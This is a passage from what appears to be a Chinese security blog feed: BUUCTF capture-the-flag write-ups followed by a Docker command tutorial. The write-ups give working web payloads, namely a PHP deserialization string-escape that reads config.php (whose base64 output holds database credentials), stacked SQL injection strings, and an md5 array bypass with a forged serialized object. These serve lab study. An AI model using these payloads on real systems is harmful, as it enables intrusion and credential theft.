&lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); # 这里会调用 class.php 的 update_profile 方法 $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;';&#125; profile.php 123456789101112131415161718&lt;?php require_once('class.php'); if($_SESSION['username'] == null) &#123; die('Login First'); &#125; $username = $_SESSION['username']; # 这里调用的是class.php 的 show_profile方法 $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header('Location: update.php'); &#125; else &#123; $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo']));?&gt; class.php 123456789101112131415161718192021222324252627282930313233public function show_profile($username) &#123; $username = parent::filter($username); $where = "username = '$username'"; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; # public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); # 这就是造成序列化漏洞的关键地方 $new_profile = parent::filter($new_profile); $where = "username = '$username'"; return parent::update($this-&gt;table, 'profile', $new_profile, $where); &#125;public function select($table, $where, $ret = '*') &#123; $sql = "SELECT $ret FROM $table WHERE $where"; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125;# 这个方法将 序列化后的内容 进行了替换 将含有'select', 'insert', 'update', 'delete', 'where' 以上关键字 替换成了 hacker 并且还进行了返回public function filter($string) &#123; $escape = array('\'', '\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); &#125; 简化来看12345678910111213141516171819202122232425262728&lt;?php$profile['phone'] = $_POST['phone'];$profile['email'] = $_POST['email'];$profile['nickname'] = $_POST['nickname'];$profile['photo'] = 'upload/';$str1 = filter(serialize($profile));var_dump($str1);echo "&lt;br/&gt;";$str2 = unserialize($str1);echo "nickname:".$str2['nickname'];echo "&lt;br/&gt;";echo "photo:".$str2['photo'];function filter($string) &#123; $escape = array('\'', '\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string);&#125;?&gt; 按照下列参数进行提交，返回的序列化结果 1phone=11111111111&amp;email=123@qq.com&amp;nickname=fany 1a:4:&#123;s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"123@qq.com";s:8:"nickname";s:4:"fany";s:5:"photo";s:7:"upload/";&#125; 提交过滤参数，看返回的序列化结果 1phone=11111111111&amp;email=123@qq.com&amp;nickname=wherewherewhere 1a:4:&#123;s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"123@qq.com";s:8:"nickname";s:15:"hackerhackerhacker";s:5:"photo";s:7:"upload/";&#125; 可以看到出现了报错，原本输入的where序列化后的长度为15，输出显示的时候，经过了filter对其内容进行了过滤，where被替换为hacker，但是序列化后的长度没有变，替换成hacker，由于where比hacker少了一位，所以在读取时，发现读取到15位的时候并没有读取到 ; 所以就照成了报错。 接下来利用这个漏洞 1phone=11111111111&amp;email=123@qq.com&amp;nickname=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";s:5:"photo";s:10:"config.php";&#125; 1a:4:&#123;s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"123@qq.com";s:8:"nickname";s:198:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:5:"photo";s:10:"config.php";&#125;";s:5:"photo";s:7:"upload/";&#125; 直接可以看到photo 变成了config.php。分析一下，&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} 的字符串长度为33，输入了33个where，总长度为33+33*5=198，在总长度不变的情况下，33个where替换成了33个hacker， 33*6=198，自然读取到的就是 结束的位置，后面接上的&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} 就接着读取。因为总属性为4个，也已经读取完毕，后边的;s:5:&quot;photo&quot;;s:7:&quot;upload/&quot;;} 就会被丢去掉。 回到题目12345678910111213141516171819202122232425if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) &#123; $username = $_SESSION['username']; if(!preg_match('/^\d&#123;11&#125;$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'; &#125; update.php 里的 会接收三个参数，$profile[‘phpone’]、$profile[‘email’]、$profile[‘nickname’]。 在传入$profile[‘ncikname’]会存在一个条件 1if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) 不是大写字母小写字母数字下划线 或者 字符串长度大于10 就直接报错，停止程序，这里直接就来一手数组绕过。 进行profile.php页面,提交，抓包。 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 得到 1PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFne2U1ZWY1MDE0LWMzZmQtNDIyYS1hNWE4LWYyMDkzMWM0YWNmYX0nOwo/Pgo= base64解码 坑点提交的时候 需要将nickname转换为数组进行提交，我提交多次都都还是读取不到，报Warning: file_get_contents(): Filename cannot be empty in /var/www/html/profile.php on line 16，看了他们的payload后，发现在ncikname处有 } 闭合，我就很纳闷，我平时序列化都是末尾才会有这个括号，后来经过验证，只要是数组，都会单独有个闭合。 payload 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【强网杯 2019】随便注 1]]></title>
    <url>%2F2021%2F03%2F26%2F%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8%201%2F</url>
    <content type="text"><![CDATA[考点：堆叠注入打开supersqli ctftraining test words 1919810931114514 更改表名 语句rename table 表名 to 新表名; 更改表名结构添加id 字段 并 设置约束alert table wordsadd id int unsigned not Null auto_increment primary key ; 将table表中得 字段flag 重命名为 dataalert table words change flag data 第一种方式原理：flag值在1919810931114514这张表中，由于select 关键字被过滤，能用show看到数据库名和表名，而页面回显的内容是words表中的内容，而在这里，我们可以进行堆叠注入，可以修改表结构，先将words表改为其他的名，然后再将1919810931114514改成words，当然还没完，页面回显的是id字段的内容，而此时的words表中的字段名为flag，这时我们就需要通过修改表结构，将flag字段改为id字段，因为flag字段的类型为varchar(100),在改成id字段名的时候也需要重新指定。1’ ; rename tables words to word1 ; rename tables 1919810931114514 to words ; alter table words change flag id varchar(100);# 第二种PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字供之后调用EXECUTE ：执行命令set @a=concat(“sel”,”ect flag from 1919810931114514“);1’;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# 第三种1’; handler 1919810931114514 open as a; handler a read next;# 总结 第一种方式还比较容易理解，到了第二第三，真不是那么好理解，使用的关键字都比较冷门，平时基本都不会用。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>堆叠注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB BUU BRUTE 1 WP]]></title>
    <url>%2F2021%2F03%2F25%2FBUU%20BRUTE%201%20WP%2F</url>
    <content type="text"><![CDATA[考点：密码爆破打开连接 分析一道登录题，以为是sql注入，其实不是，只是一道简单的4位数字密码爆破题，账号经过测试，存在admin，打开bp，抓包爆破。 拿到flag]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>密码爆破</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB BUU CODE REVIEW 1 WP]]></title>
    <url>%2F2021%2F03%2F25%2FBUU%20CODE%20REVIEW%201%20WP%2F</url>
    <content type="text"><![CDATA[考点：绕过md5加密和反序列化打开1234567891011121314151617181920212223242526272829303132&lt;?php/** * Created by PhpStorm. * User: jinzhao * Date: 2019/10/6 * Time: 8:04 PM */highlight_file(__FILE__);class BUU &#123; public $correct = ""; public $input = ""; public function __destruct() &#123; try &#123; $this-&gt;correct = base64_encode(uniqid()); if($this-&gt;correct === $this-&gt;input) &#123; echo file_get_contents("/flag"); &#125; &#125; catch (Exception $e) &#123; &#125; &#125;&#125;if($_GET['pleaseget'] === '1') &#123; if($_POST['pleasepost'] === '2') &#123; if(md5($_POST['md51']) == md5($_POST['md52']) &amp;&amp; $_POST['md51'] != $_POST['md52']) &#123; unserialize($_POST['obj']); &#125; &#125;&#125; 分析一道反序列化题，分析代码后，要拿到flag，必须要达到下面几个条件。 $_GET[&#39;pleaseget&#39;]===1 $_POST[&#39;pleasepost&#39;]===2 md5($_POST[&#39;md51&#39;])==md5($_POST[&#39;md52&#39;])&amp;&amp;$_POST[&#39;md51&#39;]!=$_POST[&#39;md52&#39;] $this-&gt;correct === $this-&gt;input 第一个和第二个条件很简单不用说，只需要提交对应的参数和参数值即可。 第三个条件，可以用数组绕过MD5加密，数组进行MD5加密会返回false。 构造md51[]=1&amp;md52[]=2 即可绕过 这才来到最关键的地方，如何在序列化前让$this-&gt;correct === $this-&gt;input 呢？，我们创建BUU类后，重新给$this-&gt;correct 赋值成 $this-&gt;input的值。 123$b1 = new BUU();$b1-&gt;correct=&amp;$b1-&gt;input;print_r(serialize($b1)); 1O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125; # 得到序列化后的内容 提交get 1?pleaseget=1 post 1pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125; 拿到flag1flag&#123;0f14da5c-5e42-49c2-b2e3-5ee2f9f1e285&#125;]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker常用命令]]></title>
    <url>%2F2021%2F03%2F12%2FDocker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[docker官网文档地址：https://docs.docker.com/get-docker/ 安装docker流程 1、卸载旧的版本 2、需要的安装报 3、设置镜像的仓库 4、安装docker需要的依赖 5、启动 阿里云容器镜像加速地址：https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors Docker基本概念镜像 容器 仓库 容器与镜像的关系类似于面向对象编程中的对象与类。 Docker常用命令 帮助命令docker version 显示docker的常用信息 1234567891011yangfan@yangfan-virtual-machine:~$ docker versionClient: Docker Engine - Community Version: 20.10.5 API version: 1.41 Go version: go1.13.15 Git commit: 55c4c88 Built: Tue Mar 2 20:18:05 2021 OS/Arch: linux/amd64 Context: default Experimental: trueGot permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.24/version: dial unix /var/run/docker.sock: connect: permission denied docker info 显示docker的信息信息，包括镜像和容器的数量 1234567891011yangfan@yangfan-virtual-machine:~$ docker infoClient: Context: default Debug Mode: false Plugins: app: Docker App (Docker Inc., v0.9.1-beta3) buildx: Build with BuildKit (Docker Inc., v0.5.1-docker)Server:ERROR: Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.24/info: dial unix /var/run/docker.sock: connect: permission deniederrors pretty printing info docker –help 显示帮助信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485yangfan@yangfan-virtual-machine:~$ docker --helpUsage: docker [OPTIONS] COMMANDA self-sufficient runtime for containersOptions: --config string Location of client config files (default "/home/yangfan/.docker") -c, --context string Name of the context to use to connect to the daemon (overrides DOCKER_HOST env var and default context set with "docker context use") -D, --debug Enable debug mode -H, --host list Daemon socket(s) to connect to -l, --log-level string Set the logging level ("debug"|"info"|"warn"|"error"|"fatal") (default "info") --tls Use TLS; implied by --tlsverify --tlscacert string Trust certs signed only by this CA (default "/home/yangfan/.docker/ca.pem") --tlscert string Path to TLS certificate file (default "/home/yangfan/.docker/cert.pem") --tlskey string Path to TLS key file (default "/home/yangfan/.docker/key.pem") --tlsverify Use TLS and verify the remote -v, --version Print version information and quitManagement Commands: app* Docker App (Docker Inc., v0.9.1-beta3) builder Manage builds buildx* Build with BuildKit (Docker Inc., v0.5.1-docker) config Manage Docker configs container Manage containers context Manage contexts image Manage images manifest Manage Docker image manifests and manifest lists network Manage networks node Manage Swarm nodes plugin Manage plugins secret Manage Docker secrets service Manage services stack Manage Docker stacks swarm Manage Swarm system Manage Docker trust Manage trust on Docker images volume Manage volumesCommands: attach Attach local standard input, output, and error streams to a running container build Build an image from a Dockerfile commit Create a new image from a container's changes cp Copy files/folders between a container and the local filesystem create Create a new container diff Inspect changes to files or directories on a container's filesystem events Get real time events from the server exec Run a command in a running container export Export a container's filesystem as a tar archive history Show the history of an image images List images import Import the contents from a tarball to create a filesystem image info Display system-wide information inspect Return low-level information on Docker objects kill Kill one or more running containers load Load an image from a tar archive or STDIN login Log in to a Docker registry logout Log out from a Docker registry logs Fetch the logs of a container pause Pause all processes within one or more containers port List port mappings or a specific mapping for the container ps List containers pull Pull an image or a repository from a registry push Push an image or a repository to a registry rename Rename a container restart Restart one or more containers rm Remove one or more containers rmi Remove one or more images run Run a command in a new container save Save one or more images to a tar archive (streamed to STDOUT by default) search Search the Docker Hub for images start Start one or more stopped containers stats Display a live stream of container(s) resource usage statistics stop Stop one or more running containers tag Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE top Display the running processes of a container unpause Unpause all processes within one or more containers update Update configuration of one or more containers version Show the Docker version information wait Block until one or more containers stop, then print their exit codesRun 'docker COMMAND --help' for more information on a command.To get more help with docker, check out our guides at https://docs.docker.com/go/guides/ 镜像命令docker images 查看所有本地的主机上的镜像 123456yangfan@yangfan-virtual-machine:~$ sudo docker images[sudo] yangfan 的密码： REPOSITORY TAG IMAGE ID CREATED SIZEmysql 5.7 a70d36bc331a 6 weeks ago 449MBcentos latest 300e315adb2f 2 months ago 209MBhello-world latest bf756fb1ae65 14 months ago 13.3kB docker search 镜像名 查找镜像 123456789101112131415161718192021222324252627yangfan@yangfan-virtual-machine:~$ sudo docker search mysqlNAME DESCRIPTION STARS OFFICIAL AUTOMATEDmysql MySQL is a widely used, open-source relation… 10570 [OK] mariadb MariaDB Server is a high performing open sou… 3949 [OK] mysql/mysql-server Optimized MySQL Server Docker images. Create… 774 [OK]percona Percona Server is a fork of the MySQL relati… 527 [OK] centos/mysql-57-centos7 MySQL 5.7 SQL database server 87 mysql/mysql-cluster Experimental MySQL Cluster Docker images. Cr… 79 centurylink/mysql Image containing mysql. Optimized to be link… 59 [OK]bitnami/mysql Bitnami MySQL Docker Image 48 [OK]deitch/mysql-backup REPLACED! Please use http://hub.docker.com/r… 41 [OK]databack/mysql-backup Back up mysql databases to... anywhere! 39 prom/mysqld-exporter 37 [OK]tutum/mysql Base docker image to run a MySQL database se… 35 schickling/mysql-backup-s3 Backup MySQL to S3 (supports periodic backup… 29 [OK]linuxserver/mysql A Mysql container, brought to you by LinuxSe… 27 centos/mysql-56-centos7 MySQL 5.6 SQL database server 20 circleci/mysql MySQL is a widely used, open-source relation… 20 mysql/mysql-router MySQL Router provides transparent routing be… 18 arey/mysql-client Run a MySQL client from a docker container 17 [OK]fradelg/mysql-cron-backup MySQL/MariaDB database backup using cron tas… 12 [OK]yloeffler/mysql-backup This image runs mysqldump to backup data usi… 7 [OK]openshift/mysql-55-centos7 DEPRECATED: A Centos7 based MySQL v5.5 image… 6 devilbox/mysql Retagged MySQL, MariaDB and PerconaDB offici… 3 ansibleplaybookbundle/mysql-apb An APB which deploys RHSCL MySQL 2 [OK]jelastic/mysql An image of the MySQL database server mainta… 1 widdpim/mysql-client Dockerized MySQL Client (5.7) including Curl… 1 [OK] docker pull 镜像名 下载镜像 默认使用最新版 1234567891011121314151617181920212223242526yangfan@yangfan-virtual-machine:~$ sudo docker pull citizenstig/dvwaUsing default tag: latestlatest: Pulling from citizenstig/dvwa8387d9ff0016: Pull complete 3b52deaaf0ed: Pull complete 4bd501fad6de: Pull complete a3ed95caeb02: Pull complete 790f0e8363b9: Pull complete 11f87572ad81: Pull complete 341e06373981: Pull complete 709079cecfb8: Pull complete 55bf9bbb788a: Pull complete b41f3cfd3d47: Pull complete 70789ae370c5: Pull complete 43f2fd9a6779: Pull complete 6a0b3a1558bd: Pull complete 934438c9af31: Pull complete 1cfba20318ab: Pull complete de7f3e54c21c: Pull complete 596da16c3b16: Pull complete e94007c4319f: Pull complete 3c013e645156: Pull complete 7b3eb1ac6cfe: Pull complete Digest: sha256:1c0ab894f0bf41351519c8388a282c0a178216e9ce8f0399a162472070379dc6Status: Downloaded newer image for citizenstig/dvwa:latestdocker.io/citizenstig/dvwa:latest 指定版本 docker pull 镜像名[:tag] 12345678910111213141516yangfan@yangfan-virtual-machine:~$ sudo docker pull mysql:5.75.7: Pulling from library/mysqla076a628af6f: Pull complete f6c208f3f991: Pull complete 88a9455a9165: Pull complete 406c9b8427c6: Pull complete 7c88599c0b25: Pull complete 25b5c6debdaf: Pull complete 43a5816f1617: Pull complete 1831ac1245f4: Pull complete 37677b8c1f79: Pull complete 27e4ac3b0f6e: Pull complete 7227baa8c445: Pull complete Digest: sha256:b3d1eff023f698cd433695c9506171f0d08a8f92a0c8063c1a4d9db9a55808dfStatus: Downloaded newer image for mysql:5.7docker.io/library/mysql:5.7 docker rmi 删除镜像包 docker rmi id 通过id删除镜像 123456789101112131415yangfan@yangfan-virtual-machine:~$ sudo docker rmi a70d36bc331aUntagged: mysql:5.7Untagged: mysql@sha256:b3d1eff023f698cd433695c9506171f0d08a8f92a0c8063c1a4d9db9a55808dfDeleted: sha256:a70d36bc331a13d297f882d3d63137d24b804f29fa67158c40ad91d5050c39c5Deleted: sha256:50c77bf7bcddd1f1d97789d80ac2404eec22c860c104e858620d2a2e321f0ef7Deleted: sha256:14244329b83dfc8982398ee4104a548385652d2bffb957798ff86a419013efd6Deleted: sha256:6d990477f90af28473eb601a9bca22253f6381e053c5a8edda0a4f027e124a3cDeleted: sha256:ee0449796df204071589162fc16f8d65586312a40c68d1ba156c93c56f5e5ce8Deleted: sha256:d08533f1e2acc40ad561a46fc6a76b54c739e6b24f077c183c5709e0a6885312Deleted: sha256:4f9d91a4728e833d1062fb65a792f06e22e425f63824f260c8b5a64b776ddc38Deleted: sha256:20bf4c759d1b0d0e6286d2145453af4e0e1b7ba3d4efa3b8bce46817ad4109deDeleted: sha256:a9371bbdf16ac95cc72555c6ad42f79b9f03a82d964fe89d52bdc5f335a5f42aDeleted: sha256:5b02130e449d94f51e8ff6e5f7d24802246198749ed9eb064631e63833cd8f1dDeleted: sha256:ab74465b38bc1acb16c23091df32c5b7033ed55783386cb57acae8efff9f4b37Deleted: sha256:cb42413394c4059335228c137fe884ff3ab8946a014014309676c25e3ac86864 docker rmi -f $(docker images -qa) 删除全部镜像 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990yangfan@yangfan-virtual-machine:~$ sudo docker rmi -f $(sudo docker images -a)Untagged: mysql:5.7Untagged: mysql@sha256:b3d1eff023f698cd433695c9506171f0d08a8f92a0c8063c1a4d9db9a55808dfDeleted: sha256:a70d36bc331a13d297f882d3d63137d24b804f29fa67158c40ad91d5050c39c5Deleted: sha256:50c77bf7bcddd1f1d97789d80ac2404eec22c860c104e858620d2a2e321f0ef7Deleted: sha256:14244329b83dfc8982398ee4104a548385652d2bffb957798ff86a419013efd6Deleted: sha256:6d990477f90af28473eb601a9bca22253f6381e053c5a8edda0a4f027e124a3cDeleted: sha256:ee0449796df204071589162fc16f8d65586312a40c68d1ba156c93c56f5e5ce8Deleted: sha256:d08533f1e2acc40ad561a46fc6a76b54c739e6b24f077c183c5709e0a6885312Deleted: sha256:4f9d91a4728e833d1062fb65a792f06e22e425f63824f260c8b5a64b776ddc38Deleted: sha256:20bf4c759d1b0d0e6286d2145453af4e0e1b7ba3d4efa3b8bce46817ad4109deDeleted: sha256:a9371bbdf16ac95cc72555c6ad42f79b9f03a82d964fe89d52bdc5f335a5f42aDeleted: sha256:5b02130e449d94f51e8ff6e5f7d24802246198749ed9eb064631e63833cd8f1dDeleted: sha256:ab74465b38bc1acb16c23091df32c5b7033ed55783386cb57acae8efff9f4b37Untagged: tomcat:latestUntagged: tomcat:9.0Untagged: tomcat@sha256:94cc18203335e400dbafcd0633f33c53663b1c1012a13bcad58cced9cd9d1305Deleted: sha256:040bdb29ab375db2a8de090070dcbee19d43f609385a934c3f2b423e515f57bbDeleted: sha256:03ac467e286d36301dba7daaec530f481074197d22d41bd48a32e5a2e3069573Deleted: sha256:c56c3d4e36aac2060fdb29c95baf4b4d6916fe9a454751b77b8d89f27dd8dda4Deleted: sha256:0f3911a87064866cd2aa7fd863afc1e02bdfa4856afa351e871f0e6a48cfd52bDeleted: sha256:7891c5716382337382836e0af1ea998bf77c1eed9c8e806c7aac5f489952f4baDeleted: sha256:56dee2fc4110951264d4b134b303920c633aabbbb0264dc218518b3547320de2Deleted: sha256:cd253bbc5a1ce457359958f4905b53a3f6f0ac167ba5065f68385600fdbae99eDeleted: sha256:03b0292dbc6978fe1077f948ac07472a8cac23fb4c3cf92c76f5eb62891e3d5aDeleted: sha256:19f2a825ed46bbf16a06d9d5185a0ac68196217f302e760abb4cbc3178b14cc1Deleted: sha256:b4f0436e967b6b9b021d3ed900a5422da6d8fe8c17c51c7d7e4f9c105812f868Deleted: sha256:4762552ad7d851a9901571428078281985074e5ddb806979dd7ad24748db4ca0Untagged: nginx:latestUntagged: nginx@sha256:10b8cc432d56da8b61b070f4c7d2543a9ed17c2b23010b43af434fd40e2ca4aaDeleted: sha256:f6d0b4767a6c466c178bf718f99bea0d3742b26679081e52dbf8e0c7c4c42d74Deleted: sha256:4dfe71c4470c5920135f00af483556b09911b72547113512d36dc29bfc5f7445Deleted: sha256:3c90a0917c79b758d74b7040f62d17a7680cd14077f734330b1994a2985283b8Deleted: sha256:a1c538085c6f891424160d8db120ea093d4dda393e94cd4713e3fff3c82299b5Deleted: sha256:a3ee2510dcf02c980d7aff635909612006fd1662084d6225e52e769b984abeb5Deleted: sha256:cb42413394c4059335228c137fe884ff3ab8946a014014309676c25e3ac86864Untagged: nginx:1.18.0-alpineUntagged: nginx@sha256:7ae8e5c3080f6012f8dc719e2308e60e015fcfa281c3b12bf95614bd8b6911d6Deleted: sha256:f2343e2e25078726ff14f81e5f530e390ac147eef63a4828db6cc2c4155ff88fDeleted: sha256:c584818973ae5022b23a6b851d2c9119b32458154a9cab36181b80edcea176cfDeleted: sha256:b6efb22fdcfd525d19e21844e59a80ca9e4b194b581961bc080977d5f69ab59aDeleted: sha256:f1d9a117248f08168772190c89436e26770693b6d5a2c61425ca905befabe858Deleted: sha256:2c1427c3e3c7078294a8cf7a4c7cdc556c83b3492ffb11149ecf0d1f7d96278bDeleted: sha256:0fcbbeeeb0d7fc5c06362d7a6717b999e605574c7210eff4f7418f6e9be9fbfeUntagged: centos:latestUntagged: centos@sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1Deleted: sha256:300e315adb2f96afe5f0b2780b87f28ae95231fe3bdd1e16b9ba606307728f55Deleted: sha256:2653d992f4ef2bfd27f94db643815aa567240c37732cae1405ad1c1309ee9859Error response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: mysqlError: No such image: 5.7Error: No such image: 6Error: No such image: weeksError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: 9.0Error: No such image: 7Error: No such image: weeksError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: tomcatError: No such image: latestError: No such image: 040bdb29ab37Error: No such image: 7Error: No such image: weeksError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: latestError: No such image: f6d0b4767a6cError: No such image: 7Error: No such image: weeksError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: nginxError: No such image: 1.18.0-alpineError: No such image: 2Error: No such image: monthsError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: latestError: No such image: 300e315adb2fError: No such image: 2Error: No such image: monthsError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercase 容器命令docker run [可选参数] [image/镜像名] 新建容器并启动 # 参数 –name=”Name” 容器名字 -d 后台方式运行 -it 使用交互方式运行，进入容器查看内容 -p 指定容器端口 -p 8080:8080 -p ip:主机端口：容器端口 -p 主机端口：容器端口（常用） -p 容器端口 容器端口 -P 随机指定端口 12345yangfan@yangfan-virtual-machine:~$ sudo docker run --name nginx2 -d -p 3355:80 nginxd5b419eeaa4675888040fe56963c692ac08ab18449abcc0554456a5eff5cb4eeyangfan@yangfan-virtual-machine:~$ sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd5b419eeaa46 nginx "/docker-entrypoint.…" 9 seconds ago Up 8 seconds 0.0.0.0:3355-&gt;80/tcp nginx2 ​ # 测试 启动并进入容器 docker run -it centos /bin/bash 退出 exit docker ps 列出当前正在运行的容器 123yangfan@yangfan-virtual-machine:~$ sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7c869b1bbcbc centos "/bin/bash" 2 hours ago Up 2 hours fervent_chatelet 参数 -a 列出所有的运行的容器+出历史运行过的容器 退出容器 exit 直接容器停止并退出 ctrl + P + Q 容器不停止退出 删除容器 docker rm 容器id 删除指定的容器，不能删除正在运行的容器 docker rm -f $(docker ps -qa) 删除所有容器 启动和停止容器的操作 docker start 容器id 启动容器 docker restart 容器id 重启容器 docker stop 容器id 停止当前正在运行的容器 docker kill 容器id 强制停止当前容器 常用其他命令后台启动容器的坑 docker容器使用后台运行，就必须要有一个前台进程，docker发现没有应用，就会自动停止 nginx，容器启动后，发现自己没有提供服务，就会立刻停止 查看日志docker logs -f -t –tail 行数 容器 查看容器中进程信息docker top 容器id 查看镜像的元数据docker inspect 容器id 进入当前正在运行的容器docker exec -it 容器id bashshell docker attach 容器id 区别 docker exec 进入容器后开启一个新的终端，可以在里面操作 docker attach 进入容器正在执行的终端，不会启动新的进程 从容器内拷贝文件到主机上docker cp 容器id:容器内路径 目的的主机路径 Docker实战操作docker 安装 nginx搜索docker search nginx 12345678910111213141516171819202122232425262728yangfan@yangfan-virtual-machine:~$ sudo docker search nginx[sudo] yangfan 的密码： NAME DESCRIPTION STARS OFFICIAL AUTOMATEDnginx Official build of Nginx. 14519 [OK] jwilder/nginx-proxy Automated Nginx reverse proxy for docker con… 1973 [OK]richarvey/nginx-php-fpm Container running Nginx + PHP-FPM capable of… 809 [OK]jc21/nginx-proxy-manager Docker container for managing Nginx proxy ho… 157 linuxserver/nginx An Nginx container, brought to you by LinuxS… 141 tiangolo/nginx-rtmp Docker image with Nginx using the nginx-rtmp… 115 [OK]jlesage/nginx-proxy-manager Docker container for Nginx Proxy Manager 98 [OK]bitnami/nginx Bitnami nginx Docker Image 94 [OK]alfg/nginx-rtmp NGINX, nginx-rtmp-module and FFmpeg from sou… 89 [OK]nginxdemos/hello NGINX webserver that serves a simple page co… 66 [OK]nginx/nginx-ingress NGINX Ingress Controller for Kubernetes 